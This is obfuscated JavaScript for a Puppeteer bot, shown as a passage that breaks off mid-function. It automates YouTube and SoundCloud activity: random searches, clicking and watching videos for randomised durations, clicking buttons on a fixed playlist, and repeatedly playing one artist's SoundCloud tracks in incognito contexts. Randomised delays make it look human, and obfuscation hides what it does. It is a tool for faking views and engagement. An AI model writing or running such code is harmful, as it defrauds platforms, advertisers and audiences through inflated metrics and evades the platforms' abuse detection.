const X = d,
  W = b,
  V = c;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xf2 * -0x14 + -0xc4 + 0x306 * -0x6);
    let h = e[f];
    if (c['ENbjpu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1a21 + 0x1 * -0x149 + 0x1b6a * 0x1, r, s, t = 0x1478 + 0x1 * -0x24cd + -0x25 * -0x71; s = m['charAt'](t++); ~s && (r = q % (-0x24af * 0x1 + 0x1d7e + 0x2d * 0x29) ? r * (-0x4 * 0x595 + 0x1f25 + -0x891) + s : s, q++ % (-0xb * -0x118 + 0x1 * 0x33b + -0xf3f)) ? o += String['fromCharCode'](-0x352 * -0xb + 0x163 * 0x5 + 0x2a76 * -0x1 & r >> (-(-0x98b * -0x4 + -0x8a8 + -0x3 * 0x9d6) * q & 0x485 + -0x6d2 + 0x253 * 0x1)) : -0x2ad * 0x1 + 0x2 * 0x6e5 + -0xb1d) {
          s = n['indexOf'](s);
        }
        for (let u = 0x15ba + -0x1 * -0x1aee + 0x48 * -0xad, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x21a + 0x4d6 + -0x6e0))['slice'](-(0x1 * -0x644 + 0x2c * 0x22 + 0x6e));
        }
        return decodeURIComponent(p);
      };
      c['bHdAgW'] = i, b = arguments, c['ENbjpu'] = !![];
    }
    const j = e[0x1218 + 0x345 * 0x5 + -0x3 * 0xb7b],
      k = f + j,
      l = b[k];
    return !l ? (h = c['bHdAgW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x318 + 0x1a65 + 0x4 * -0x75f))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x7f * -0x4d + -0x180a + 0x2f * 0x153), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x517c + 0x1 * -0xb556 + -0x2 * -0xbe01 + (0x48cb + 0x4 * 0xddf + -0x45af * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(0x10ed * 0x1 + -0x9 * -0x319 + -0xca3 * 0x2 + (-0x4654 + -0x6 * -0xc6a + 0x22e8) * random()), -0x1 * 0x1257 + 0xb2b * 0x1 + 0x72d;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x572 + 0xcb * 0x8 + 0x7be), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x12 * 0x20b + 0x1 * -0x2f2 + -0x21d3;
}
async function randomWait() {
  return await wait(-0x179b + 0x1b4 * -0x5 + 0x761 * 0x7 + (0xc * 0x1bb + -0x1d6c + 0x386 * 0x8) * random()), 0x5 * 0x1a1 + -0x106f + 0xc1 * 0xb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1dad + -0x1e56 + 0xa9, -0x8e4 * 0x1 + -0x25ca + 0x43f * 0xb), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x17a1c + -0x3f * 0x551 + -0xbf33 * -0x1) * getRandomInt(0x8a6 + 0x10ff + -0x19a3, -0x1fad + -0x5bf * 0x1 + 0x2571), h)), -0x1 * 0x2b0 + 0x1c1d * 0x1 + 0x196c * -0x1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xf2 * -0x14 + -0xc4 + 0x306 * -0x6);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + R(0x0, '%U@t')],
      j = 0x2077 + -0xbd0 + 0x11 * -0x137;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xafe + -0x1 * -0x2352 + -0x2e4f]['split']('\x20');
    for (let k = 0x22da + 0x1d8e + -0x4068; k < i['length']; k += 0x2e8 * -0x8 + 0x4 * -0x3b5 + 0x2616)
      j += i[k] * h[i[k + (0x13c9 * 0x1 + 0x349 + -0x1711)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels[S(0x16)]()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2 * 0xf76 + -0xdc0 + 0x2cb2)['map'](l => Array['from'](l['children']))['flat'](0xfcd * -0x1 + -0x18e4 * 0x1 + 0x2 * 0x1459)['map'](l => l['childNodes'][-0x23e3 + 0x1 * -0x1087 + 0x346b]['childNodes'][-0xc1e + 0x1207 + -0x59 * 0x11]['childNodes'][-0x14ae + 0xcf + 0x13e0]['childNodes'][0x1433 + -0x1234 + -0x1 * 0x1ff]['childNodes'][-0x581 + -0x13c3 + 0x1 * 0x1945]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x24a8 + -0x185 * -0xf + 0x1 * -0x378b, 0xc7 * 0x18 + -0x2 * -0xdbe + 0x1 * -0x1a9c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x4eb * 0x7 + -0x593 * 0x4 + -0x1 * -0x7351);
  const h = await getMaxTime(f),
    i = Math['min']((-0x36d1 * -0x4 + -0x8 * 0x30aa + 0x1946c) * getRandomInt(0x1f69 + 0x1 * -0x146f + -0xaf8, 0x12b3 + 0xbd9 * 0x2 + -0x2a60), h);
  return await wait(i), -0x8 * 0x463 + -0x1c03 + 0x4 * 0xfc7;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1378 + 0xed4 + 0x4a4]['children'][-0x85d + 0x1e93 + 0x2 * -0xb1b]['children'][0x24f2 + 0xa33 + -0x2f25]['children'][-0x1c9 + -0x13bc + 0x1585]['children'][-0x834 + 0x3 * -0x92b + -0x33f * -0xb]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1413 + 0x2358 + -0xf44;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x3 * -0x56b + -0x114a + 0x21ef + (-0xc7 * -0xd + 0x5 * -0x34f + 0x6a2) * random()
  }), await wait(-0x1b9d + 0x1cc1 + 0x8 * 0x1a + (-0x1 * 0x21f7 + 0x118a + 0x1199) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x141b + 0x25f * -0x8 + -0x121]['childNodes'][0x1 * 0x2230 + -0x22f0 + -0xc1 * -0x1]['childNodes'][-0x14f6 * -0x1 + 0x34b * 0x3 + -0xf6b * 0x2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2 * 0x853 + -0x31 * -0x8c + -0x2b6d]['childNodes'][0x3ab * 0x7 + -0xcf6 + -0xcb7]['childNodes'][0x1ad6 + 0xf * 0xa7 + -0x1 * 0x249d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x176b * -0x1 + -0x166f * 0x1 + -0x1 * 0xfb),
          r = 0x2262 + 0x389 * 0x6 + -0x3798;
        for (let u = -0x2470 + -0x1 * -0x25f0 + -0x180; u < q['length']; u += 0x159a + 0x5 * 0x2f + -0x153 * 0x11)
          r += q[u] * k[q[u + (0x4b * -0x36 + -0x1 * -0x149c + -0xf5 * 0x5)]];
        return r;
      }(n);
  });
  await wait((0x3f64 + -0x16aa + 0x8ef * 0x2) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1 * 0x1a77f + -0xe33f + 0x988 * 0x4) * getRandomInt(-0x10b2 + 0xb * 0x52 + -0x1 * -0xd2d, 0x79 * -0xd + 0x1a * 0x149 + -0x1 * 0x1b3b), h + (-0x1 * -0x88 + -0xd * 0x74 + 0x18e4));
  return await wait(i), 0x11f * -0x3 + 0x1eec + 0x2 * -0xdc7;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x11eb + -0x9cd + -0x81e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x61 * -0x52 + 0x1f * 0x13f + -0x39fb + (0x1646 + 0x11f0 + -0x244e) * Math['random']());
    });
  }, 0xc * -0x3d + -0x199d * 0x1 + 0x37d1);
  await wait(-0x5a34a + 0x91a * 0x7f + 0x5b344);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2 * 0x4475 + 0xad3d + 0xc60d * 0x1) * getRandomInt(0x45d + -0x1226 + 0xdcd, 0x1143 * -0x1 + 0x1a2a + 0x2 * -0x467)), clearInterval(h), -0x12ca + 0x3 * -0x433 + 0x1f64;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1674 + 0xf2 * -0x1 + -0x1582;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * 0x83 + 0x1c * 0x6 + -0x24;
    await randomWait();
  }
  return -0x1 * 0x147a + 0x1cd0 + -0x3 * 0x2c7;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1aad + 0x13 * 0xde + 0x2b27 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x175 * 0x2 + 0x424 * 0x1 + -0x13a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bk = [
    'W6SPfq',
    'BNGYltrSnhm0tG',
    'tZqTqJnprLbezG',
    'WQK+zvBcMSkzW7tcVJSr',
    'xmowqfvLcexcNwGw',
    'Ag9WzsbIDhmSyG',
    'o-catch-an',
    'Ahr0Chm6lY9VCa',
    'hYr5D1HOb8oiWRmF',
    'sgT2uxL3z191wG',
    'DY53C2OUy29TlW',
    'WRCZemkYW7ZcK8kVxwa/',
    'Aw4VBMv2zxiTAa',
    'yununeXKzhvUEa',
    'WOO8w8o0W6KE',
    'DMvYEs1Uzxr3BW',
    'oc4WlJuZntKUmq',
    'yxnZAwDU',
    'Ew91DhvIzwv4Da',
    'neTtBtnjwtDyEG',
    'BcDkD2m',
    'x8k/WRpcUSoLWRKUaCoYW6i',
    'random',
    'CMCVzw4VC2nYAq',
    'sSoUWPnMWRL1u1uIW7u',
    'WQbvW5HHdmodf8kqx3G'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xa95 + 0x15d9 + -0xb44 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xa4d + 0x1fc6 + -0x2a13 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + T(0x18, 'ljaR') + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x146a5 * 0x1 + -0xf275 + 0x2e8e2 + getRandomInt(-0x4f83 + 0xbc5 + 0x7e56 * 0x1, -0xae6a * 0x1 + 0x2 * -0x12a8 + 0x2 * 0xa475));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0xa15 + 0x52 * 0x72 + 0x47 * -0xa8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x11 * -0x6 + 0xee + -0x88;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1e8 * -0xe + 0x16 * 0x15d + -0x38ae, 0x1062 + 0x384 + -0x13b4)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x35 * 0x33 + 0x1f51 * -0x1 + 0x18 * 0x212 + floor((-0x208 + -0x2 * 0xb57 + 0x2 * 0xe4f) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x735d3fa6 + -0x874758ea + -0x4c * -0x4fb6dcc),
          -0x4caba3 + -0x5ce0fe + 0x1298ca1,
          -0x1 * 0xf56b + 0x466 * -0x25 + 0x21829 * 0x1,
          0x9 * 0xa3 + 0x2137 + -0x103 * 0x26
        ], y = [
          -0x101 * -0x1f + 0x767 * 0x3 + -0x353c,
          0xc4 * 0x22 + 0x752 + 0x1 * -0x214a,
          -0x69b + 0xc7d + -0x5da,
          -0xa16 + 0x3d * 0x2 + 0x99c
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x9a3 * -0x4 + 0x1 * 0x19b + -0x2826)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              const U = b;
              return L[U(0xe, '!8%v')]()['update'](M);
            }, J = -0x897 + -0x11ee + 0x1a85; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1920 + 0x53 * 0x3b + 0x133 * 0x5) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x6b * 0x1c + 0x15a7 * -0x1 + 0x215b * 0x1] = A[-0x24a4 + -0x529 * 0x1 + -0x1 * -0x29dd] = A[0x587 + 0x1 * -0x21f5 + 0x1 * 0x1c6f] = A[0x3 * -0x2 + 0x2053 * -0x1 + 0x205b] = A[-0xc * -0x32 + 0xa5 * -0x2d + -0x6 * -0x472] = A[-0xb1 * 0x35 + 0x21b + 0x228e] = A[-0x351 * 0x5 + 0x90f * -0x3 + 0x1 * 0x2bc7] = A[0x17 * 0x10b + 0x1af8 + -0xdd * 0x3b] = A[-0x8d6 + -0x1 * -0x151f + -0xc42] = A[0x147 * 0x2 + -0x1143 + 0xebd] = A[0x6be + -0x20ec + 0x1 * 0x1a37] = A[0xe55 * 0x1 + -0x897 + 0x5b4 * -0x1] = A[0x92 * -0x3a + -0x26b5 + 0x47d4] = A[-0x26c0 + -0x1fbd * 0x1 + 0x4689] = A[-0x1 * 0xbc3 + 0x1826 * 0x1 + 0x62b * -0x2] = A[0x4fa + -0x2c5 * -0xc + 0xcb8 * -0x3] = A[-0x13 * -0xef + -0x26c8 + -0x2 * -0xa8d] = 0x6cb + -0x1222 + -0xb57 * -0x1, this['blocks'] = A) : this['blocks'] = [
                -0xd * 0x2ff + -0xca5 + 0x3398,
                -0x465 * 0x5 + -0x1915 + 0x2f0e,
                0x9b * 0x23 + -0xffd * 0x1 + -0x534,
                0x1e82 + -0x2 * 0xa58 + 0x6 * -0x1a3,
                -0x761 * 0x1 + -0x695 + 0xdf6,
                0xc0b * 0x3 + 0x18c4 + -0x3ce5,
                -0x1b83 * 0x1 + -0x1f16 + 0x85f * 0x7,
                0x9 * -0x359 + 0x35 * 0x66 + 0x903,
                0x168e + -0x653 * 0x3 + -0x83 * 0x7,
                -0x2708 + 0xb2a + 0x1bde,
                0x2071 + -0xefc + 0x6d * -0x29,
                0x22 * 0x14 + -0x37a * -0x8 + -0x4b * 0x68,
                0xccb * -0x1 + 0x16d1 + -0xa06,
                -0x1769 + 0x137e + -0x1 * -0x3eb,
                0x165b * 0x1 + -0x88 * -0x1 + -0x15 * 0x117,
                0x1837 + 0x34f + -0x1b86,
                -0x1 * 0x22a + -0x2684 + -0x52 * -0x7f
              ], this['h0'] = -0x2d1e0d1d + -0x1d90fa71 + 0xb1f42a8f, this['h1'] = 0xe23a9 * -0x1055 + 0x179a34153 + 0x5d16d153, this['h2'] = 0xc0b2b11 + -0x1 * 0x127e40d2d + 0x1b493bf1a, this['h3'] = 0x1a3c3457 + -0x1779ade * -0x8 + -0x15c6b6d1, this['h4'] = -0x3d * 0x20d28c3 + 0x115cab447 + 0x226 * 0x1417b0, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1343 * -0x2 + -0x2437 + 0x169 * 0x35, this['finalized'] = this['hashed'] = 0xf00 + -0x479 * 0x1 + -0xa87, this['first'] = -0x1 * 0xdc7 + 0x217d + -0x13b5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x450 + -0x1207 * 0x2 + 0x1de * 0x11, O = J['length'] || 0x957 * -0x1 + -0x1 * -0x1305 + 0x19d * -0x6, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xd20 + 0x101d + -0x2fd, P[-0x18d4 + 0x823 * 0x3 + 0x6b] = this['block'], P[-0x73b + -0x1fad + -0x137c * -0x2] = P[-0x1a72 + -0x1 * -0x55d + -0xa8b * -0x2] = P[0x12cf + 0x2 * -0x3a1 + -0xf * 0xc5] = P[-0x2468 + 0x25f7 * -0x1 + 0x4a62 * 0x1] = P[0x683 * 0x2 + -0x1408 + 0x706] = P[-0x1 * 0x1d23 + 0x22df + -0x5b7] = P[-0xae3 + -0x26eb + 0x31d4] = P[0x222 * 0xa + 0x20b3 + -0x4 * 0xd80] = P[0x9 * 0x169 + -0x180f + 0x1 * 0xb66] = P[0x1162 + 0xfb0 + 0xb03 * -0x3] = P[-0x684 + -0x19a8 + 0x2036] = P[-0x162 * -0x18 + 0xa5a + 0x5 * -0x8b3] = P[0x5 * 0x413 + -0x163d + 0xf5 * 0x2] = P[-0x7 * 0xed + -0x4 * -0x55b + -0xee4 * 0x1] = P[0x1 * 0xf8e + 0x2 * 0xfa + -0x2 * 0x8ba] = P[0x1fc3 + -0x6 * -0x1fc + -0x4 * 0xae7] = -0x1 * 0x257 + 0x859 * 0x4 + -0x1f0d * 0x1), K) {
                    for (N = this['start']; M < O && N < 0x5 * 0x6d + 0x16ec + -0x7 * 0x38b; ++M)
                      P[N >> -0x7 * -0x331 + -0x582 + 0x10d3 * -0x1] |= J[M] << y[-0xdb * -0x4 + -0x607 + 0x86 * 0x5 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2566 + 0x135a + 0x124c; ++M)
                      (L = J['charCodeAt'](M)) < -0x4 * -0x26b + 0x148a * -0x1 + 0xb5e ? P[N >> -0x22a7 + 0x6c0 + 0x1be9] |= L << y[-0x7b4 + 0x530 * 0x4 + -0xd09 & N++] : L < -0x21fe + 0x1 * 0x16e1 + 0x1 * 0x131d ? (P[N >> -0x20c3 * -0x1 + -0xe9a + -0x1227] |= (-0x25c9 + -0x1 * -0x153d + 0x114c | L >> -0x3fd + 0x11f8 + -0x18d * 0x9) << y[-0xdbd * -0x1 + 0x19a7 + -0x2761 & N++], P[N >> 0x9 * -0x38c + 0x37 * 0x95 + -0x15] |= (0x2067 + -0xf3b * 0x1 + 0x2 * -0x856 | -0x629 + 0xc5a + 0x1 * -0x5f2 & L) << y[0x1 * 0xc86 + -0x1 * 0x252d + 0x18aa & N++]) : L < 0x144f2 + 0x1 * 0x7d73 + 0xea65 * -0x1 || L >= -0x30a5 + 0x13f04 + -0x2e5f ? (P[N >> -0x1536 + 0x4 * 0x509 + -0x2e * -0x6] |= (-0x8ef * -0x1 + 0x1b65 + 0x2 * -0x11ba | L >> -0x7 * 0x2f6 + -0xe31 + -0x22f7 * -0x1) << y[-0x11 * 0x1f9 + -0x1998 + 0x3b24 & N++], P[N >> -0x1b91 + 0x5 * -0x585 + 0x372c * 0x1] |= (-0x1c6 * 0x8 + 0x2 * 0x949 + -0x1 * 0x3e2 | L >> 0x856 + -0x8d6 + 0x86 & -0xb7 * -0x6 + 0xbf8 * 0x3 + -0x27f3) << y[0x24ba + 0xea6 + -0x335d & N++], P[N >> 0xa6f + -0xb3b + 0x2 * 0x67] |= (0x1b6f + 0x1 * 0x1987 + -0x3476 | 0xf3 * -0xf + 0x44 * -0x5b + 0x26a8 & L) << y[0x15 + -0x2707 * -0x1 + -0x2719 & N++]) : (L = 0x14072 * 0x1 + 0x3 * -0x11e6 + -0xac0 + ((0xbd * 0x21 + -0x23fc + -0x1 * -0xf9e & L) << 0xa08 + -0xdd3 + -0x3 * -0x147 | -0x17 * -0x59 + -0xdfb * -0x2 + -0x1ff6 * 0x1 & J['charCodeAt'](++M)), P[N >> -0xbc2 + 0x1 * 0x1dbb + -0x1ff * 0x9] |= (-0x94e * -0x3 + 0xffa + -0x2af4 | L >> -0x79d * 0x5 + 0x3e * -0x20 + 0x2de3) << y[0xd6d + 0x10de + -0x1e48 & N++], P[N >> -0x7be + -0x1cff * 0x1 + 0x17 * 0x199] |= (0x1 * 0x156d + 0x18e9 * 0x1 + -0x2dd6 | L >> 0xa * 0xf6 + -0x10d4 + 0x744 & 0x8a1 * -0x1 + 0x5 * -0x3b + -0x97 * -0x11) << y[-0x2e9 * -0x5 + 0x25bb * -0x1 + 0x1 * 0x1731 & N++], P[N >> -0x7f6 * 0x2 + 0x2a7 * -0x7 + 0x1 * 0x227f] |= (0x1fa4 + 0xbcb + -0x1d * 0x17b | L >> -0xa * -0xef + -0x375 * -0x2 + 0x81d * -0x2 & -0x18ca + 0x170e + 0x1fb) << y[-0xd2c + -0x2 * -0x509 + 0x1 * 0x31d & N++], P[N >> 0x1 * -0x4f + 0x1d * 0x8b + -0x9e * 0x19] |= (0x165c + 0x166 + 0xd * -0x1ca | -0x26b1 + 0x14 * 0x101 + 0x8e * 0x22 & L) << y[0xe7c + 0x74b + -0x1c * 0xc7 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1463 + -0x22 * -0x86 + -0x9 * 0x437 ? (this['block'] = P[-0x1 * -0x1a8d + -0x5cc + -0x14b1 * 0x1], this['start'] = N - (0x1 * -0x971 + -0x131 * -0x1f + -0x1b3e), this['hash'](), this['hashed'] = -0xd0a + -0x5 * 0x2b1 + 0x1a80) : this['start'] = N;
                }
                return this['bytes'] > -0xdfc81a9f + 0x175daec1f + 0x69ed2e7f * 0x1 && (this['hBytes'] += this['bytes'] / (0x2 * -0xc05fbf88 + 0x2a * 0x2fa868 + -0x5ffd40 * -0x698) << 0x1 * 0x119 + -0x1ac2 + 0x19a9, this['bytes'] = this['bytes'] % (0x1702c * -0xf58 + 0x3df804 * -0x832 + 0x311ebb3e8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x997 + -0x1 * -0x5e4 + -0xf7a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
